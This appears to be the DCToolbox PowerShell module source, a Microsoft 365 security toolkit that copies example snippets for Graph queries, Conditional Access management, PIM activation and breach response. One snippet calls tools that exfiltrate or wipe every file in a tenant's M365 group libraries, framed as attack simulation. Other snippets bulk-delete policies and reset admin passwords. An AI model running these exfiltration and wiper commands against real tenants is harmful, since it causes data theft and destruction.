function Get-DCHelp {
    $DCToolboxVersion = '2.0.11'


    $HelpText = @"

    ____  ____________            ____              
   / __ \/ ____/_  __/___  ____  / / /_  ____  _  __
  / / / / /     / / / __ \/ __ \/ / __ \/ __ \| |/_/
 / /_/ / /___  / / / /_/ / /_/ / / /_/ / /_/ />  <  
/_____/\____/ /_/  \____/\____/_/_.___/\____/_/|_|  

A PowerShell toolbox for Microsoft 365 security fans.

---------------------------------------------------

Author: Daniel Chronlund
Version: $DCToolboxVersion

This PowerShell module contains a collection of tools for Microsoft 365 security tasks, Microsoft Graph functions, Entra ID management, Conditional Access, zero trust strategies, attack and defense scenarios, etc.

The home of this module: https://github.com/DanielChronlund/DCToolbox

Please follow me on my blog https://danielchronlund.com, on LinkedIn and on Twitter!

@DanielChronlund


To get started, explore and copy script examples to your clipboard with:

"@

    Write-Host -ForegroundColor "Yellow" $HelpText
    Write-Host -ForegroundColor "Cyan" "Copy-DCExample"
    Write-Host ""
}



function Copy-DCExample {
    function CreateMenu {
        param
        (
            [parameter(Mandatory = $true)]
            [string]$MenuTitle,
            [parameter(Mandatory = $true)]
            [string[]]$MenuChoices
        )
		
        # Create a counter.
        $Counter = 1
		
        # Write menu title.
        Write-Host -ForegroundColor "Yellow" "*** $MenuTitle ***"
        Write-Host -ForegroundColor "Yellow" ""
		
        # Generate the menu choices.
        foreach ($MenuChoice in $MenuChoices) {
            Write-Host -ForegroundColor "Yellow" "[$Counter] $MenuChoice"
			
            # Add to counter.
            $Counter = $Counter + 1
        }
		
        # Write empty line.
        Write-Host -ForegroundColor "Yellow" ""
		
        # Write exit line.
        Write-Host -ForegroundColor "Yellow" "[0] Quit"
		
        # Write empty line.
        Write-Host -ForegroundColor "Yellow" ""
		
        # Prompt user for input.
        $prompt = "Choice"
        Read-Host $prompt
		
        # Return users choice.
        return $prompt
    }
	
	
    # Function for handling the menu choice.
    function HandleMenuChoice {
        param
        (
            [parameter(Mandatory = $true)]
            [string[]]$MenuChoice
        )
		
        # Menu choices.
        switch ($MenuChoice) {
            1 {
                $Snippet = @'
# Microsoft Graph with PowerShell examples.


# *** Connect Examples ***

# Connect to Microsoft Graph with delegated permissions.
$AccessToken = Invoke-DCEntraIDDeviceAuthFlow -ReturnAccessTokenInsteadOfRefreshToken


# Connect to Microsoft Graph with application permissions.
$Parameters = @{
    TenantName = 'example.onmicrosoft.com'
    ClientID = ''
    ClientSecret = ''
}

$AccessToken = Connect-DCMsGraphAsApplication @Parameters


# *** Microsoft Graph Query Examples ***

# GET data from Microsoft Graph.
$Parameters = @{
    AccessToken = $AccessToken
    GraphMethod = 'GET'
    GraphUri = 'https://graph.microsoft.com/v1.0/users'
}

Invoke-DCMsGraphQuery @Parameters


# POST changes to Microsoft Graph.
$Parameters = @{
    AccessToken = $AccessToken
    GraphMethod = 'POST'
    GraphUri = 'https://graph.microsoft.com/v1.0/users'
    GraphBody = @"
<Insert JSON request body here>
"@
} 

Invoke-DCMsGraphQuery @Parameters


# PUT changes to Microsoft Graph.
$Parameters = @{
    AccessToken = $AccessToken
    GraphMethod = 'PUT'
    GraphUri = 'https://graph.microsoft.com/v1.0/users'
    GraphBody = @"
<Insert JSON request body here>
"@
} 

Invoke-DCMsGraphQuery @Parameters


# PATCH changes to Microsoft Graph.
$Parameters = @{
    AccessToken = $AccessToken
    GraphMethod = 'PATCH'
    GraphUri = 'https://graph.microsoft.com/v1.0/users'
    GraphBody = @"
<Insert JSON request body here>
"@
} 

Invoke-DCMsGraphQuery @Parameters


# DELETE data from Microsoft Graph.
$Parameters = @{
    AccessToken = $AccessToken
    GraphMethod = 'DELETE'
    GraphUri = 'https://graph.microsoft.com/v1.0/users'
} 

Invoke-DCMsGraphQuery @Parameters


<#
    Filter examples:
    /users?$filter=startswith(givenName,'J')
    /users?$filter=givenName eq 'Test'
#>


# Learn more about the Graph commands.
help Connect-DCMsGraphAsDelegated -Full
help Connect-DCMsGraphAsApplication -Full
help Invoke-DCMsGraphQuery -Full

'@

                Set-Clipboard $Snippet

                Write-Host -ForegroundColor "Yellow" ""
                Write-Host -ForegroundColor "Yellow" "Example copied to clipboard!"
                Write-Host -ForegroundColor "Yellow" ""
            }
            2 {
                $Snippet = @'
# Manage Conditional Access as code.

<#
The user running this (the one who signs in when the authentication pops up) must have the appropriate permissions in Entra ID (Global Admin, Security Admin, Conditional Access Admin, etc).
#>

# OPTIONAL: To get another Global Admin to pre-consent to ALL required permissions for ALL Conditional Access tools in DCToolbox, ask them to run the following code in PowerShell (and make sure they Consent these permissions on behalf of the whole organisation).

Install-Module Microsoft.Graph -Scope CurrentUser -Force

$Scopes = 'Group.ReadWrite.All',
'Policy.ReadWrite.ConditionalAccess',
'Policy.Read.All', 'Directory.Read.All',
'Agreement.ReadWrite.All',
'Application.Read.All',
'RoleManagement.ReadWrite.Directory'

Connect-MgGraph -Scopes $Scopes



# --- Show Conditional Access Policies ---

# Show basic info about Conditional Access policies in the tenant.
Get-DCConditionalAccessPolicies

# Show policy names only.
Get-DCConditionalAccessPolicies -NamesOnly

# Show Conditional Access policies in the tenant with targeted users and groups.
Get-DCConditionalAccessPolicies -ShowTargetResources -PrefixFilter 'GLOBAL - GRANT - MFA for All Users'

# Show detailed info about Conditional Access policies in the tenant.
Get-DCConditionalAccessPolicies -Details -PrefixFilter 'GLOBAL - GRANT - MFA for All Users'

# Show Named Locations in the tenant.
Get-DCNamedLocations

# Filter Named Locations with a prefix.
Get-DCNamedLocations -PrefixFilter 'OFFICE-'

# List all trusted IP addresses in Named Locations.
(Get-DCNamedLocations | where isTrusted -eq $true).ipRanges | Select-Object -Unique | Sort-Object

# List all countries in Named Locations.
(Get-DCNamedLocations).countriesAndRegions | Select-Object -Unique | Sort-Object


# --- Rename Conditional Access Policies ---

# Rename Conditional Access policies.
Rename-DCConditionalAccessPolicies -PrefixFilter 'PILOT - ' -AddCustomPrefix 'PROD - '

# Add a prefix to specific Conditional Access policies.
Rename-DCConditionalAccessPolicies -PrefixFilter 'GLOBAL - ' -AddCustomPrefix 'OLD - GLOBAL - '

# Add a prefix to ALL existing Conditional Access policies.
Rename-DCConditionalAccessPolicies -AddCustomPrefix 'OLD - '


# --- Delete Conditional Access Policies ---

# Delete ALL Conditional Access policies.
Remove-DCConditionalAccessPolicies

# Delete all Conditional Access policies with a specific prefix.
Remove-DCConditionalAccessPolicies -PrefixFilter 'OLD - '

# Delete all Conditional Access policies WITHOUT a specific prefix (like -PrefixFilter but reversed).
Remove-DCConditionalAccessPolicies -ReversedPrefixFilter 'GLOBAL - '


# --- Deploy Conditional Access Baseline PoC ---

# Deploy a complete Conditional Access PoC in report-only mode from https://danielchronlund.com.
Deploy-DCConditionalAccessBaselinePoC

# Deploy a complete Conditional Access PoC in production mode from https://danielchronlund.com (Dangerous).
Deploy-DCConditionalAccessBaselinePoC -SkipReportOnlyMode

# Deploy a complete Conditional Access PoC in report-only mode with a PILOT prefix.
Deploy-DCConditionalAccessBaselinePoC -AddCustomPrefix 'PILOT - '


# --- Bulk Manage Conditional Access Policies ---

# Toggle Conditional Access policies between 'All users' and specified pilot group.
Set-DCConditionalAccessPoliciesPilotMode -PrefixFilter 'GLOBAL - ' -PilotGroupName 'Conditional Access Pilot' -EnablePilot

# Toggle Conditional Access policies between specified pilot group and 'All users'.
Set-DCConditionalAccessPoliciesPilotMode -PrefixFilter 'GLOBAL - ' -PilotGroupName 'Conditional Access Pilot' -EnableProduction

# Toggle specified Conditional Access policies between 'Enabled' and 'Report-only'.
Set-DCConditionalAccessPoliciesReportOnlyMode -PrefixFilter 'GLOBAL - ' -SetToReportOnly

# Toggle specified Conditional Access policies between 'Report-only' and 'Enabled'.
Set-DCConditionalAccessPoliciesReportOnlyMode -PrefixFilter 'GLOBAL - ' -SetToEnabled

# Exclude specified break glass group from all Conditional Access policies.
Add-DCConditionalAccessPoliciesBreakGlassGroup -PrefixFilter 'GLOBAL - ' -ExcludeGroupName 'Excluded from Conditional Access'


# --- Export/Import Conditional Access Policies (JSON file) ---

# Export your Conditional Access policies to a JSON file for backup (default file name).
Export-DCConditionalAccessPolicyDesign

# Export your Conditional Access policies to a JSON file for backup (custom file name).
Export-DCConditionalAccessPolicyDesign -FilePath 'C:\Temp\Conditional Access Backup.json'

# Export Conditional Access policies with a specifc prefix.
$Parameters = @{
    FilePath = 'Conditional Access.json'
    PrefixFilter = 'GLOBAL - '
}
Export-DCConditionalAccessPolicyDesign @Parameters

# Import Conditional Access policies from a JSON file exported by Export-DCConditionalAccessPolicyDesign.
$Parameters = @{
    FilePath = 'C:\Temp\Conditional Access Backup.json'
    SkipReportOnlyMode = $false
    DeleteAllExistingPolicies = $false
}

Import-DCConditionalAccessPolicyDesign @Parameters

# Import Conditional Access policies and add a custom prefix.
$Parameters = @{
    FilePath = 'C:\Temp\Conditional Access Backup.json'
    SkipReportOnlyMode = $false
    DeleteAllExistingPolicies = $false
    AddCustomPrefix = 'TEST - '
}

Import-DCConditionalAccessPolicyDesign @Parameters


# --- Generate Conditional Access Excel Reports ---

# Export Conditional Access policy design report to Excel.
New-DCConditionalAccessPolicyDesignReport

# Export Conditional Access Assignment Report to Excel.
$Parameters = @{
    IncludeGroupMembers = $false
}

New-DCConditionalAccessAssignmentReport @Parameters

'@

                Set-Clipboard $Snippet

                Write-Host -ForegroundColor "Yellow" ""
                Write-Host -ForegroundColor "Yellow" "Example copied to clipboard!"
                Write-Host -ForegroundColor "Yellow" ""
            }
            3 {
                $Snippet = @'
# Install required modules (if you are local admin) (only needed first time).
Install-Module -Name DCToolbox -Force
Install-Module -Name AzureAdPreview -Force
Install-Package msal.ps -Force

# Install required modules as current user (if you're not local admin) (only needed first time).
Install-Module -Name DCToolbox -Scope CurrentUser -Force
Install-Module -Name AzureAdPreview -Scope CurrentUser -Force
Install-Package msal.ps -Scope CurrentUser -Force


# If you want to, you can run Connect-AzureAd before running Enable-DCEntraIDPIMRole, but you don't have to.

# If you want to use another account than your current account using SSO, first connect with this.
Connect-AzureAd -AccountId 'user@example.com'

# Enable one of your Entra ID PIM roles.
Enable-DCEntraIDPIMRole

# Enable multiple Entra ID PIM roles.
Enable-DCEntraIDPIMRole -RolesToActivate 'Exchange Administrator', 'Security Reader'

# Fully automate Entra ID PIM role activation.
Enable-DCEntraIDPIMRole -RolesToActivate 'Exchange Administrator', 'Security Reader' -UseMaximumTimeAllowed -Reason 'Performing some Exchange security coniguration according to change #12345.'

<#
    Example output:

    VERBOSE: Connecting to Entra ID...

    *** Activate PIM Role ***

    [1] User Account Administrator
    [2] Application Administrator
    [3] Security Administrator
    [0] Exit

    Choice: 3
    Reason: Need to do some security work!
    Duration [1 hour(s)]: 1
    VERBOSE: Activating PIM role...
    VERBOSE: Security Administrator has been activated until 11/13/2020 11:41:01!
#>


# Learn more about Enable-DCEntraIDPIMRole.
help Enable-DCEntraIDPIMRole -Full

# Privileged Identity Management | My roles:
# https://portal.azure.com/#blade/Microsoft_Azure_PIMCommon/ActivationMenuBlade/aadmigratedroles

# Privileged Identity Management | Entra ID roles | Overview:
# https://portal.azure.com/#blade/Microsoft_Azure_PIMCommon/ResourceMenuBlade/aadoverview/resourceId//resourceType/tenant/provider/aadroles

'@

                Set-Clipboard $Snippet

                Write-Host -ForegroundColor "Yellow" ""
                Write-Host -ForegroundColor "Yellow" "Example copied to clipboard!"
                Write-Host -ForegroundColor "Yellow" ""
            }
            4 {
                $Snippet = @'
# Learn how to set this up.
Get-Help New-DCStaleAccountReport -Full


# Export stale Entra ID account report to Excel.
$Parameters = @{
    ClientID = ''
    ClientSecret = ''
    LastSeenDaysAgo = 30
}

New-DCStaleAccountReport @Parameters


# Export stale GUEST Entra ID account report to Excel.
$Parameters = @{
    ClientID = ''
    ClientSecret = ''
    LastSeenDaysAgo = 60
    OnlyGuests = $true
}

New-DCStaleAccountReport @Parameters


# Export stale MEMBER Entra ID account report to Excel.
$Parameters = @{
    ClientID = ''
    ClientSecret = ''
    LastSeenDaysAgo = 60
    OnlyMembers = $true
}

New-DCStaleAccountReport @Parameters


# Export stale GUEST Entra ID account report with group/team membership to Excel.
$Parameters = @{
    ClientID = ''
    ClientSecret = ''
    LastSeenDaysAgo = 60
    OnlyGuests = $true
    IncludeMemberOf = $true
}

New-DCStaleAccountReport @Parameters

'@

                Set-Clipboard $Snippet

                Write-Host -ForegroundColor "Yellow" ""
                Write-Host -ForegroundColor "Yellow" "Example copied to clipboard!"
                Write-Host -ForegroundColor "Yellow" ""
            }
            5 {
                $Snippet = @'
### Clean up phone authentication methods for all Entra ID users ###

<#
    Set the registered applications ClientID and ClientSecret further down. This script requires the following Microsoft Graph permissions:
    Delegated:
        UserAuthenticationMethod.ReadWrite.All
        Reports.Read.All

    It also requires the DCToolbox PowerShell module:
    Install-Module -Name DCToolbox -Force

    Note that this script cannot delete a users phone method if it is set as the default authentication method. Microsoft Graph cannot, as of 7/10 2021, manage the default authentication method for users in Entra ID. Hopefully the users method of choice was changed when he/she switched to the Microsoft Authenticator app or another MFA/passwordless authentication method. If not, ask them to change the default method before running the script.

    Use the following report to understand how many users are registered for phone authentication (can lag up to 48 hours): https://portal.azure.com/#blade/Microsoft_AAD_IAM/AuthenticationMethodsMenuBlade/AuthMethodsActivity
#>


# Connect to Microsoft Graph with delegated permissions.
Write-Verbose -Verbose -Message 'Connecting to Microsoft Graph...'
$Parameters = @{
    ClientID     = ''
    ClientSecret = ''
}

$AccessToken = Connect-DCMsGraphAsDelegated @Parameters


# Fetch all users with phone authentication enabled from the Entra ID authentication usage report (we're using this usage report to save time and resources when querying Graph, but their might be a 24 hour delay in the report data).
Write-Verbose -Verbose -Message 'Fetching all users with any phone authentication methods registered...'
$Parameters = @{
    AccessToken = $AccessToken
    GraphMethod = 'GET'
    GraphUri    = "https://graph.microsoft.com/beta/reports/credentialUserRegistrationDetails?`$filter=authMethods/any(t:t eq microsoft.graph.registrationAuthMethod'mobilePhone') or authMethods/any(t:t eq microsoft.graph.registrationAuthMethod'officePhone')"
}

$AllUsersWithPhoneAuthentication = Invoke-DCMsGraphQuery @Parameters


# Output the number of users found.
Write-Verbose -Verbose -Message "Found $($AllUsersWithPhoneAuthentication.Count) users!"


# Loop through all those users.
$ProgressCounter = 0
foreach ($User in $AllUsersWithPhoneAuthentication) {
    # Show progress bar.
    $ProgressCounter += 1
    [int]$PercentComplete = ($ProgressCounter / $AllUsersWithPhoneAuthentication.Count) * 100
    Write-Progress -PercentComplete $PercentComplete -Activity "Processing user $ProgressCounter of $($AllUsersWithPhoneAuthentication.Count)" -Status "$PercentComplete% Complete"

    # Retrieve a list of registered phone authentication methods for the user. This will return up to three objects, as a user can have up to three phones usable for authentication.
    Write-Verbose -Verbose -Message "Fetching phone methods for $($User.userPrincipalName)..."
    $Parameters = @{
        AccessToken = $AccessToken
        GraphMethod = 'GET'
        GraphUri    = "https://graph.microsoft.com/beta/users/$($User.userPrincipalName)/authentication/phoneMethods"
    }

    $phoneMethods = Invoke-DCMsGraphQuery @Parameters

    <#
        The value of id corresponding to the phoneType to delete is one of the following:

        b6332ec1-7057-4abe-9331-3d72feddfe41 to delete the alternateMobile phoneType.
        e37fc753-ff3b-4958-9484-eaa9425c82bc to delete the office phoneType.
        3179e48a-750b-4051-897c-87b9720928f7 to delete the mobile phoneType.
    #>

    # Loop through all user phone methods.
    foreach ($phoneMethod in $phoneMethods) {
        # Delete the phone method.
        try {
            if ($phoneMethod.phoneType) {
                Write-Verbose -Verbose -Message "Deleting phone method '$($phoneMethod.phoneType)' for $($User.userPrincipalName)..."
                $Parameters = @{
                    AccessToken = $AccessToken
                    GraphMethod = 'DELETE'
                    GraphUri    = "https://graph.microsoft.com/beta/users/$($User.userPrincipalName)/authentication/phoneMethods/$($phoneMethod.id)"
                }

                Invoke-DCMsGraphQuery @Parameters | Out-Null
            }
        }
        catch {
            Write-Warning -Message "Could not delete phone method '$($phoneMethod.phoneType)' for $($User.userPrincipalName)! Is it the users default authentication method?"
        }
    }
}


break

# BONUS SCRIPT: LIST ALL GUEST USERS WITH SMS AS A REGISTERED AUTHENTICATION METHOD.

# First, create app registration and grant it:
#  User.Read.All
#  UserAuthenticationMethod.Read.All
#  Reports.Read.All


# Connect to Microsoft Graph with delegated permissions.
Write-Verbose -Verbose -Message 'Connecting to Microsoft Graph...'
$Parameters = @{
    ClientID = ''
    ClientSecret = ''
}

$AccessToken = Connect-DCMsGraphAsDelegated @Parameters


# Fetch user authentication methods.
Write-Verbose -Verbose -Message 'Fetching all users with any phone authentication methods registered...'
$Parameters = @{
    AccessToken = $AccessToken
    GraphMethod = 'GET'
    GraphUri    = "https://graph.microsoft.com/beta/reports/credentialUserRegistrationDetails?`$filter=authMethods/any(t:t eq microsoft.graph.registrationAuthMethod'mobilePhone') or authMethods/any(t:t eq microsoft.graph.registrationAuthMethod'officePhone')"
}

$AllUsersWithPhoneAuthentication = Invoke-DCMsGraphQuery @Parameters


# Fetch all guest users.
Write-Verbose -Verbose -Message 'Fetching all guest users...'
$Parameters = @{
    AccessToken = $AccessToken
    GraphMethod = 'GET'
    GraphUri    = "https://graph.microsoft.com/beta/users?`$filter=userType eq 'Guest'"
}

$AllGuestUsers = Invoke-DCMsGraphQuery @Parameters


# Check how many users who have an authentication phone number registered.
foreach ($Guest in $AllGuestUsers) {
    if ($AllUsersWithPhoneAuthentication.userPrincipalName.Contains($Guest.UserPrincipalName)) {
        Write-Output "$($Guest.displayName) ($($Guest.mail))"
    }
}
                            
'@

                Set-Clipboard $Snippet

                Write-Host -ForegroundColor "Yellow" ""
                Write-Host -ForegroundColor "Yellow" "Example copied to clipboard!"
                Write-Host -ForegroundColor "Yellow" ""
            }
            6 {
                $Snippet = @'
<#
    .SYNOPSIS
        A simple script template.

    .DESCRIPTION
        Write a description of what the script does and how to use it.
        
    .PARAMETER Parameter1
        Inputs a string into the script.
            
    .PARAMETER Parameter2
        Inputs an integer into the script.
            
    .PARAMETER Parameter3
        Sets a script switch.

    .INPUTS
        None

    .OUTPUTS
        System.String

    .NOTES
        Version:        1.0
        Author:         Daniel Chronlund
        Creation Date:  2021-01-01

    .EXAMPLE
        Script-Template -Parameter "Text" -Verbose

    .EXAMPLE
        Script-Template -Parameter "Text" -Verbose
#>



# ----- [Initialisations] -----

# Script parameters.
param (
    [parameter(Mandatory = $true)]
    [string]$Parameter1 = "Text",

    [parameter(Mandatory = $true)]
    [int32]$Parameter2 = 1,

    [parameter(Mandatory = $false)]
    [switch]$Parameter3
)


# Set Error Action - Possible choices: Stop, SilentlyContinue
$ErrorActionPreference = "Stop"



# ----- [Declarations] -----

# Variable 1 description.
$Variable1 = ""

# Variable 2 description.
$Variable2 = ""



# ----- [Functions] -----

function function1
{
    <#
        .SYNOPSIS
            A brief description of the function1 function.
        
        .DESCRIPTION
            A detailed description of the function1 function.
        
        .PARAMETER Parameter1
            A description of the Parameter1 parameter.
        
        .EXAMPLE
            function1 -Parameter1 'Value1'
    #>


    param (
        [parameter(Mandatory = $true)]
        [string]$Parameter1
    )


    $Output = $Parameter1

    $Output
}



# ----- [Execution] -----

# Do the following.
function1 -Parameter1 'Test'



# ----- [End] -----

'@

                Set-Clipboard $Snippet

                Write-Host -ForegroundColor "Yellow" ""
                Write-Host -ForegroundColor "Yellow" "Example copied to clipboard!"
                Write-Host -ForegroundColor "Yellow" ""
            }
            7 {
                $Snippet = @'
# README: This script is an example of what you might want to/need to do if your Entra ID has been breached. This script was created in the spirit of the zero trust assume breach methodology. The idea is that if you detect that attackers are already on the inside, then you must try to kick them out. This requires multiple steps and you also must handle other resources like your on-prem AD. However, this script example helps you in the right direction when it comes to Entra ID admin roles.

# More info on my blog: https://danielchronlund.com/2021/03/29/my-azure-ad-has-been-breached-what-now/

break



# *** Connect to Entra ID ***
Import-Module AzureAdPreview
Connect-AzureAd



# *** Interesting Entra ID roles to inspect ***
$InterestingDirectoryRoles = 'Global Administrator',
'Global Reader',
'Privileged Role Administrator',
'Security Administrator',
'Application Administrator',
'Compliance Administrator'



# *** Inspect current Entra ID admins (if you use Entra ID PIM) ***

# Fetch tenant ID.
$TenantID = (Get-AzureAdTenantDetail).ObjectId

# Fetch all Entra ID role definitions.
$EntraIDRoleDefinitions = Get-AzureAdMSPrivilegedRoleDefinition -ProviderId "aadRoles" -ResourceId $TenantID | Where-Object { $_.DisplayName -in $InterestingDirectoryRoles }

# Fetch all Entra ID PIM role assignments.
$EntraIDDirectoryRoleAssignments = Get-AzureAdMSPrivilegedRoleAssignment -ProviderId "aadRoles" -ResourceId $TenantID | Where-Object { $_.RoleDefinitionId -in $EntraIDRoleDefinitions.Id }

# Fetch Entra ID role members for each role and format as custom object.
$EntraIDDirectoryRoleMembers = foreach ($EntraIDDirectoryRoleAssignment in $EntraIDDirectoryRoleAssignments) {
    $UserAccountDetails = Get-AzureAdUser -ObjectId $EntraIDDirectoryRoleAssignment.SubjectId

    $LastLogon = (Get-AzureAdAuditSigninLogs -top 1 -filter "UserId eq '$($EntraIDDirectoryRoleAssignment.SubjectId)'" | Select-Object CreatedDateTime).CreatedDateTime

    if ($LastLogon) {
        $LastLogon = [System.TimeZoneInfo]::ConvertTimeBySystemTimeZoneId((Get-Date -Date $LastLogon), (Get-TimeZone).Id)
    }

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "EntraIDDirectoryRole" -Value ($EntraIDRoleDefinitions | Where-Object { $_.Id -eq $EntraIDDirectoryRoleAssignment.RoleDefinitionId }).DisplayName
    $CustomObject | Add-Member -MemberType NoteProperty -Name "UserID" -Value $UserAccountDetails.ObjectID
    $CustomObject | Add-Member -MemberType NoteProperty -Name "UserAccount" -Value $UserAccountDetails.DisplayName
    $CustomObject | Add-Member -MemberType NoteProperty -Name "UserPrincipalName" -Value $UserAccountDetails.UserPrincipalName
    $CustomObject | Add-Member -MemberType NoteProperty -Name "AssignmentState" -Value $EntraIDDirectoryRoleAssignment.AssignmentState
    $CustomObject | Add-Member -MemberType NoteProperty -Name "AccountCreated" -Value $UserAccountDetails.ExtensionProperty.createdDateTime
    $CustomObject | Add-Member -MemberType NoteProperty -Name "LastLogon" -Value $LastLogon
    $CustomObject
}

# List all Entra ID role members (newest first).
$EntraIDDirectoryRoleMembers | Sort-Object AccountCreated -Descending | Format-Table



# *** Inspect current Entra ID admins (only if you do NOT use Entra ID PIM) ***

# Interesting Entra ID roles to inspect.
$InterestingDirectoryRoles = 'Global Administrator',
'Global Reader',
'Privileged Role Administrator',
'Security Administrator',
'Application Administrator',
'Compliance Administrator'

# Fetch Entra ID role details.
$EntraIDDirectoryRoles = Get-AzureAdDirectoryRole | Where-Object { $_.DisplayName -in $InterestingDirectoryRoles }

# Fetch Entra ID role members for each role and format as custom object.
$EntraIDDirectoryRoleMembers = foreach ($EntraIDDirectoryRole in $EntraIDDirectoryRoles) {
    $RoleAssignments = Get-AzureAdDirectoryRoleMember -ObjectId $EntraIDDirectoryRole.ObjectId

    foreach ($RoleAssignment in $RoleAssignments) {
        $LastLogon = (Get-AzureAdAuditSigninLogs -top 1 -filter "UserId eq '$($RoleAssignment.ObjectId)'" | Select-Object CreatedDateTime).CreatedDateTime

        if ($LastLogon) {
            $LastLogon = [System.TimeZoneInfo]::ConvertTimeBySystemTimeZoneId((Get-Date -Date $LastLogon), (Get-TimeZone).Id)
        }

        $CustomObject = New-Object -TypeName psobject
        $CustomObject | Add-Member -MemberType NoteProperty -Name "EntraIDDirectoryRole" -Value $EntraIDDirectoryRole.DisplayName
        $CustomObject | Add-Member -MemberType NoteProperty -Name "UserID" -Value $RoleAssignment.ObjectID
        $CustomObject | Add-Member -MemberType NoteProperty -Name "UserAccount" -Value $RoleAssignment.DisplayName
        $CustomObject | Add-Member -MemberType NoteProperty -Name "UserPrincipalName" -Value $RoleAssignment.UserPrincipalName
        $CustomObject | Add-Member -MemberType NoteProperty -Name "AccountCreated" -Value $RoleAssignment.ExtensionProperty.createdDateTime
        $CustomObject | Add-Member -MemberType NoteProperty -Name "LastLogon" -Value $LastLogon
        $CustomObject
    }
}

# List all Entra ID role members (newest first).
$EntraIDDirectoryRoleMembers | Sort-Object AccountCreated -Descending | Format-Table



# *** Check if admin accounts are synced from on-prem (bad security) ***

# Loop through the admins from previous output and fetch sync status.
$SyncedAdmins = foreach ($EntraIDDirectoryRoleMember in $EntraIDDirectoryRoleMembers) {
    $IsSynced = (Get-AzureAdUser -ObjectId $EntraIDDirectoryRoleMember.UserID | Where-Object {$_.DirSyncEnabled -eq $true}).DirSyncEnabled

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "UserID" -Value $EntraIDDirectoryRoleMember.UserID
    $CustomObject | Add-Member -MemberType NoteProperty -Name "UserAccount" -Value $EntraIDDirectoryRoleMember.UserAccount
    $CustomObject | Add-Member -MemberType NoteProperty -Name "UserPrincipalName" -Value $EntraIDDirectoryRoleMember.UserPrincipalName

    if ($IsSynced) {
        $CustomObject | Add-Member -MemberType NoteProperty -Name "SyncedOnPremAccount" -Value 'True'
    } else {
        $CustomObject | Add-Member -MemberType NoteProperty -Name "SyncedOnPremAccount" -Value 'False'
    }
    
    $CustomObject
}

# List admins (synced on-prem accounts first).
$SyncedAdmins | Sort-Object UserPrincipalName -Descending -Unique | Sort-Object SyncedOnPremAccount -Descending | Format-Table



# *** ON-PREM SYNC PANIC BUTTON: Block all Entra ID admin accounts that are synced from on-prem ***
# WARNING: Make sure you understand what you're doing before running this script!

# Loop through admins synced from on-prem and block sign-ins.
foreach ($SyncedAdmin in ($SyncedAdmins | Where-Object { $_.SyncedOnPremAccount -eq 'True' })) {
    Set-AzureAdUser -ObjectID $SyncedAdmin.UserID -AccountEnabled $false
}

# Check account status.
foreach ($SyncedAdmin in ($SyncedAdmins | Where-Object { $_.SyncedOnPremAccount -eq 'True' })) {
    Get-AzureAdUser -ObjectID $SyncedAdmin.UserID | Select-Object userPrincipalName, AccountEnabled
}



# *** Check admins last password set time ***

# Connect to Microsoft online services.
Connect-MsolService

# Loop through the admins from previous output and fetch LastPasswordChangeTimeStamp.
$AdminPasswordChanges = foreach ($EntraIDDirectoryRoleMember in ($EntraIDDirectoryRoleMembers| Sort-Object UserID -Unique)) {
    $LastPasswordChangeTimeStamp = [System.TimeZoneInfo]::ConvertTimeBySystemTimeZoneId((Get-Date -Date (Get-MsolUser -ObjectId $EntraIDDirectoryRoleMember.UserID | Select-Object LastPasswordChangeTimeStamp).LastPasswordChangeTimeStamp), (Get-TimeZone).Id)

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "UserID" -Value $EntraIDDirectoryRoleMember.UserID
    $CustomObject | Add-Member -MemberType NoteProperty -Name "UserAccount" -Value $EntraIDDirectoryRoleMember.UserAccount
    $CustomObject | Add-Member -MemberType NoteProperty -Name "UserPrincipalName" -Value $EntraIDDirectoryRoleMember.UserPrincipalName
    $CustomObject | Add-Member -MemberType NoteProperty -Name "LastPasswordChangeTimeStamp" -Value $LastPasswordChangeTimeStamp
    $CustomObject
}

# List admins (newest passwords first).
$AdminPasswordChanges | Sort-Object LastPasswordChangeTimeStamp -Descending | Format-Table



# *** ADMIN PASSWORD PANIC BUTTON: Reset passwords for all Entra ID admins (except for current user and break glass accounts) ***
# WARNING: Make sure you understand what you're doing before running this script!

# IMPORTANT: Define your break glass accounts.
$BreakGlassAccounts = 'breakglass1@example.onmicrosoft.com', 'breakglass2@example.onmicrosoft.com'

# The current user running PowerShell against Entra ID.
$CurrentUser = (Get-AzureAdCurrentSessionInfo).Account.Id

# Loop through admins and set new complex passwords (using generated GUIDs).
foreach ($EntraIDDirectoryRoleMember in ($EntraIDDirectoryRoleMembers | Sort-Object UserPrincipalName -Unique)) {
    if ($EntraIDDirectoryRoleMember.UserPrincipalName -notin $BreakGlassAccounts -and $EntraIDDirectoryRoleMember.UserPrincipalName -ne $CurrentUser) {
        Write-Verbose -Verbose -Message "Setting new password for $($EntraIDDirectoryRoleMember.UserPrincipalName)..."
        Set-AzureAdUserPassword -ObjectId $EntraIDDirectoryRoleMember.UserID -Password (ConvertTo-SecureString (New-Guid).Guid -AsPlainText -Force)
    } else {
        Write-Verbose -Verbose -Message "Skipping $($EntraIDDirectoryRoleMember.UserPrincipalName)!"
    }
}

'@

                Set-Clipboard $Snippet

                Write-Host -ForegroundColor "Yellow" ""
                Write-Host -ForegroundColor "Yellow" "Example copied to clipboard!"
                Write-Host -ForegroundColor "Yellow" ""
            }
            8 {
                $Snippet = @'
# This script uses an Entra ID app registration to download all files from all M365 groups (Teams) document libraries in a tenant.

# One of the following Graph API app permissions is required:
# - Files.Read.All
# - Files.ReadWrite.All
# - Sites.Read.All
# - Sites.ReadWrite.All

# Simulate data exfiltration.
Invoke-DCM365DataExfiltration -ClientID '' -ClientSecret '' -TenantName 'COMPANY.onmicrosoft.com' -WhatIf

# Perform data exfiltration.
Invoke-DCM365DataExfiltration -ClientID '' -ClientSecret '' -TenantName 'COMPANY.onmicrosoft.com'


# This script uses an Entra ID app registration to wipe all files from all M365 groups (Teams) document libraries in a tenant.

# One of the following Graph API app permissions is required:
# - Files.ReadWrite.All
# - Sites.ReadWrite.All

# Simulate data deletion.
Invoke-DCM365DataWiper -ClientID '' -ClientSecret '' -TenantName 'COMPANY.onmicrosoft.com' -WhatIf

# Perform data deletion.
Invoke-DCM365DataWiper -ClientID '' -ClientSecret '' -TenantName 'COMPANY.onmicrosoft.com'

'@

                Set-Clipboard $Snippet

                Write-Host -ForegroundColor "Yellow" ""
                Write-Host -ForegroundColor "Yellow" "Example copied to clipboard!"
                Write-Host -ForegroundColor "Yellow" ""
            }
            100 {
                $Snippet = @'
# 
'@

